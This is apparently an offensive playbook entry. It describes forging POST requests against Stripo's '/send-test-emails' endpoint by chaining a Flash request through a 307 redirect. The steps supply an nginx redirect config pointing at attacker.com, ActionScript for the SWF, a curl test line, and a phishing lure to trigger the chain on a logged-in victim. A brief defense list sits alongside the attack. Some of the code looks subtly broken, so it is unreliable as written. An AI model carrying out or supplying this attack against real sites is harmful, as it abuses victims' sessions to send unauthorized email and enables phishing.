---
id: proc-csrf-307-trigger
tags:
  - csrf
  - redirect
  - '307'
  - forgery
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:15.953Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-CSRF-via-307-Redirect

## Summary

This procedure exploits a CSRF vulnerability by using a 307 Temporary Redirect in conjunction with a Flash-initiated request to forge POST actions to the target's email testing endpoint, sending unauthorized test emails.

## Description

The 307 redirect status code preserves the original request method (POST) and body during redirection, allowing an attacker to chain a cross-origin request from Flash to a redirector URL that points to the vulnerable Stripo endpoint (e.g., '/send-test-emails'). Without XSRF token checks, the request uses the victim's session cookies, executing the action as if initiated by the user. This can lead to service abuse, such as mass email sending for spam.

## Requirements

1. Malicious Flash file from prior procedure
2. Control over a redirect endpoint (e.g., attacker-controlled server)
3. Victim authenticated to Stripo with active session

## Defense

Defensive measures and detection strategies:

- Validate XSRF tokens on all non-GET endpoints
- Use SameSite=Strict cookies to prevent cross-site usage
- Log and alert on unexpected 307 redirects or anomalous POSTs to testing endpoints

## Objectives

1. Forge a state-changing POST request without tokens
2. Leverage victim's session for unauthorized email dispatch
3. Confirm exploitation via sent emails

## Instructions

### Step 1: Setup Redirect Endpoint

**Context**: Configure an attacker server to issue a 307 redirect to the target's vulnerable endpoint with forged parameters.

Use a simple HTTP server config (e.g., nginx):

```nginx
location /csrf-redirect {
    return 307 https://stripo.com/send-test-emails;
    add_header Location "https://stripo.com/send-test-emails?to=victim@email.com&subject=Test&body=Malicious";
}
```

> Expected output: Accessing http://attacker.com/csrf-redirect triggers 307 to target with params. Test with curl: curl -v -X POST http://attacker.com/csrf-redirect.

### Step 2: Integrate with Flash

**Context**: Modify the Flash to target the redirect URL instead of direct endpoint.

Update ActionScript:

```actionscript
import flash.net.URLRequest;
import flash.net.sendToURL;

var req:URLRequest = new URLRequest("http://attacker.com/csrf-redirect");
req.method = URLRequestMethod.POST;
req.data = "to=target@email.com&subject=Forged&body=Content";
sendToURL(req);
```

Recompile SWF.

> Expected output: Flash sends POST to redirector, which 307s to target. Verify no CORS errors.

### Step 3: Trigger on Victim

**Context**: Lure victim to the malicious page; Flash auto-executes the chain.

Host and send phishing link to victim.

> Expected output: Victim's session used to send emails. Check email logs or recipient inboxes for confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[redirect]]
- [[307]]
- [[forgery]]
